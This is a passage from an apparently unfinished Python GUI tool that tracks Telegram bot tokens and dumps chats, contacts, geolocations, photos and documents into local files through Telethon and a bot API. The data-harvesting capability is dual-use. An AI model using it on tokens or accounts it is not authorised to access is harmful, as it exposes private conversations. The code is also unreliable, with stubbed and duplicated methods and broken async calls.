            cursor.execute("INSERT INTO bots VALUES (?, ?, ?, ?, ?, ?, ?)", (token, bot_name, username, status, submission_date, last_checked_date, last_dumped_date))

        # Commit the changes and close the database connection
        connection.commit()
        connection.close()

######--------------------------------------------------------------##########
######--------------- DUMPING MESSAGES FUNCTIONS --------------------##########

    def initiate_dumpMessages(self):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.setup_and_dump())

    async def setup_and_dump(self):
        await self.setup_connection()
        await self.select_dialog()
        await self.dumpMessages()

    async def setup_connection(self):
        if not self.client:
            try:
                self.client = TelegramClient('session', API_ID, API_HASH)
                phone = self.get_phone_number()
                if phone:
                    await self.client.connect()
                    if not await self.client.is_user_authorized():
                        await self.client.send_code_request(phone)
                        code = self.get_verification_code()  # 
                        try:
                            await self.client.sign_in(phone, code)
                        except SessionPasswordNeededError:
                            password = self.get_password()  # 
                            await self.client.sign_in(password=password)
                    self.console_text_edit_2.append("Connected to Telegram.")
                else:
                    self.console_text_edit_2.append("Phone number input cancelled.")
            except Exception as e:
                self.console_text_edit_2.append(f"Error connecting to Telegram: {str(e)}")
                self.client = None
        else:
            self.console_text_edit_2.append("Already connected to Telegram.")

    def get_phone_number(self):
        phone, ok = QInputDialog.getText(self, 'Phone Number', 'Enter your phone number:')
        if ok:
            return phone
        else:
            self.console_text_edit_2.append("Phone number input cancelled.")
            return None

    async def select_dialog(self):
        dialogs = await self.client.get_dialogs()
        if dialogs:
            self.dialog = dialogs[0]
            self.console_text_edit_2.append(f"Selected dialog: {self.dialog.name}")
        else:
            self.console_text_edit_2.append("No dialogs found.")

    async def dumpMessages(self):
        if not self.dialog:
            self.console_text_edit_2.append("No dialog selected. Please select a chat or channel first.")
            return

        messages_by_chat = {}
        messages_by_chat[self.dialog.id] = []
        batch_size = 100
        messages = []
        processed_messages = 0

        try:
            last_message_id = self.get_last_dumped_message_id(self.dialog.id)
            total_messages = await self.client.get_messages(self.dialog, limit=None).total

            async for message in self.client.iter_messages(self.dialog, offset_id=last_message_id):
                messages.append(message)
                processed_messages += 1

                if len(messages) >= batch_size:
                    messages_by_chat[self.dialog.id].extend(messages)
                    await self.write_messages_to_file(self.dialog.id, messages_by_chat[self.dialog.id])
                    self.save_last_dumped_message_id(self.dialog.id, message.id)
                    messages = []

                # Update progress
                progress = (processed_messages / total_messages) * 100
                self.update_progress_bar(progress)

                await asyncio.sleep(0.1)

            if messages:
                messages_by_chat[self.dialog.id].extend(messages)
                await self.write_messages_to_file(self.dialog.id, messages_by_chat[self.dialog.id])
                self.save_last_dumped_message_id(self.dialog.id, messages[-1].id)

            self.console_text_edit_2.append("Messages dumped successfully.")
        except Exception as e:
            self.console_text_edit_2.append(f"Error dumping messages: {str(e)}")

    def get_last_dumped_message_id(self, dialog_id):
        return None

    def save_last_dumped_message_id(self, dialog_id, message_id):
        self.console_text_edit_2.append(f"Last dumped message ID for dialog {dialog_id}: {message_id}")

    async def write_messages_to_file(self, dialog_id, messages):
        filename = f"messages_{dialog_id}.json"
        async with aiofiles.open(filename, 'w') as f:
            await f.write(json.dumps(messages, default=str))
        self.console_text_edit_2.append(f"Messages written to {filename}")

    def update_progress_bar(self, progress):
        self.progressBar.setValue(int(progress))
        self.console_text_edit_2.append(f"Progress: {progress:.2f}%")

    def displaySuccessMessage(self, message):
        self.console_text_edit_2.append(message)

    def displayErrorMessage(self, message):
        self.console_text_edit_2.append(message)

######--------------------------------------------------------------##########
######--------------- DUMPING PHOTOS FUNCTIONS --------------------##########



    async def process_media(self, bot, m, chat_id):
        if isinstance(m.media, MessageMediaGeo):
            return f'Geoposition: {m.media.geo.long}, {m.media.geo.lat}'
        elif isinstance(m.media, MessageMediaPhoto):
            await self.save_media_photo(bot, chat_id, m.media.photo)
            return f'Photo: media/{m.media.photo.id}.jpg'
        elif isinstance(m.media, MessageMediaContact):
            return f'Vcard: phone {m.media.phone_number}, {m.media.first_name} {m.media.last_name}, rawdata {m.media.vcard}'
        elif isinstance(m.media, MessageMediaDocument):
            full_filename = await self.save_media_document(bot, chat_id, m.media.document)
            filename = os.path.split(full_filename)[-1]
            return f'Document: media/{filename}'
        else:
            return str(m.media)

    async def save_media_photo(self, bot, chat_id, photo):
        user_media_dir = os.path.join("media", chat_id, 'media')
        os.makedirs(user_media_dir, exist_ok=True)
        try:
            await bot.download_file(photo, os.path.join(user_media_dir, f'{photo.id}.jpg'))
            self.displaySuccessMessage(f"Media saved successfully for chat ID: {chat_id}")
        except Exception as e:
            self.displayErrorMessage(f"Error saving media: {str(e)}")

    async def saveMedia_function(self, bot, chat_id, document):
        user_media_dir = os.path.join(base_path, str(chat_id), 'media')
        os.makedirs(user_media_dir, exist_ok=True)
        try:
            file_path = os.path.join(user_media_dir, f'{document.id}.{document.mime_type.split("/")[1]}')
            await bot.download_file(document, file_path)
            self.displaySuccessMessage(f"Media saved successfully for chat ID: {chat_id}")
        except Exception as e:
            self.displayErrorMessage(f"Error saving media: {str(e)}")
    
    
    def initiate_saveMedia_function(self):
        # Get the necessary information from your UI
        bot_token = self.bot_manager_text_input.toPlainText()
        chat_id = self.telegram_chat_id_text_input.toPlainText()

        document = self.get_document_to_save()  # Implement this method
        
        if not bot_token or not chat_id or not document:
            self.displayErrorMessage("Missing required information for saving media.")
            return
        
        # Create a bot instance
        bot = telebot.TeleBot(bot_token)
        
        # Run the async function
        asyncio.run(self.saveMedia_function(bot, chat_id, document))

    def saveMediaphoto_function(self):
        self.displaySuccessMessage("Media photo save initiated.")


######--------------------------------------------------------------##########
######--------------- DUMPING DOCUMENTS FUNCTIONS --------------------##########






    def get_document_to_save(self):
        # Implement this method to return the document to be saved
        # This could open a file dialog or use a predefined document
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Document to Save")
        if file_path:
            return open(file_path, 'rb')
        return None
    
    def get_document_filename(self, document):
        for attr in document.attributes:
            if isinstance(attr, DocumentAttributeFilename):
                return attr.file_name
        if isinstance(attr, DocumentAttributeAudio) or isinstance(attr, DocumentAttributeVideo):
            return f'{document.id}.{document.mime_type.split("/")[1]}'
        return None


    def saveChat_function(self):
        self.displaySuccessMessage("Chat save initiated.")
        # Implement the logic to save chat data

    def saveUser_function(self):
        self.displaySuccessMessage("User save initiated.")
        # Implement the logic to save user data

    def saveTokensOnQuit(self):
        # Save tokens to the database before quitting
        pass


    def displaySuccessMessage(self, message):
        self.console_text_edit_2.append(message)

    def displayErrorMessage(self, message):
        self.console_text_edit_2.append(message)


    


    def update_progress_bar(self, progress):
        # Implement this method to update the progress bar
        self.progressBar.setValue(int(progress))





if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
    asyncio.run(app.setup_connection())